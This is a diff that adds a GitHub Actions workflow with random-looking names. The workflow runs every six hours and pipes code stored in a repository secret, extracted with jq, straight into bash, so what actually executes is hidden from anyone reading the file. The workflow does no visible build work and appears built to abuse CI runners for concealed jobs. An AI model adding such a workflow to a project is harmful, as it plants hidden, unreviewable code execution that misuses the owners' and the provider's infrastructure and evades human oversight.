@@ -1,0 +1,20 @@
+name: catheadmundane
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: catheadmundane
+        env:
+          g99: ${{ secrets.g99 }}
+        run: |
+          echo $g99 | jq -r .wzn9824 | /bin/bash
+          echo $wrt9504 | jq -r .t8731 | /bin/bash
+
